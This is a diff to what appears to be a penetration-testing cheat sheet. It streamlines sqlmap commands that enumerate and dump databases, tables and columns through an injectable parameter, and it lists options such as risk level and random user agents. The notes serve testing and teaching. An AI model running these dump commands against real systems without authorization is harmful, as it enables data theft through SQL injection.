@@ -191,18 +191,20 @@ ffuf -request request.txt -w <FUZZ_wordlist> -request-proto http -fs <size>
 
 ```bash
 # Enumerate DBMS databases
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent --dbs
+sqlmap -r request.txt -p <target_param> --dbs
 
 # Enumerate DBMS database tables
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> --tables
+sqlmap -r request.txt -p <target_param> -D <DB_name> --tables
 
 # Enumerate DBMS database table columns
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> --columns
+sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> --columns
 
 # Dump DBMS database table entries
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump
+sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump
 
 # SQLMap options
+--level=<level>         # Set level of tests to perform (1-5, default 1)
+--risk=<risk>           # Set risk of tests to perform (1-3, default 1)
 --delay=<delay_seconds> # Delay in seconds between each HTTP request
 --batch                 # Never ask for user input, use the default behavior
 --random-agent          # Use randomly selected HTTP User-Agent header value
